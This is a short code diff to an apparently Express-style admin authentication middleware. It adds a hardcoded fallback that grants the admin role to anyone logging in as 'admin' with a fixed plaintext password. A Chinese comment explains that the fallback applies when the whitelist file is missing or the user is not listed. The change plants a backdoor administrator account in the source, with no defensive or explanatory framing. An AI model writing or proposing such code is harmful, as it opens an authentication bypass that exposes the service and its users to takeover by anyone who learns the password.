@@ -140,6 +140,11 @@ function requireAdminToken(req, res, next) {
   }
   const match = wl.find(w => w.username === user && w.password === pass);
   if (!match) {
+    // 白名单文件不存在或不在其中的硬编码兜底
+    if (user === 'admin' && pass === 'afu_admin_2026') {
+      req.adminUser = { username: 'admin', role: 'admin' };
+      return next();
+    }
     // 也兼容旧的 ?token=xxx 方式（保留过渡）
     const token = req.query.token || '';
     if (token && (process.env.ADMIN_TOKEN && token === process.env.ADMIN_TOKEN)) {
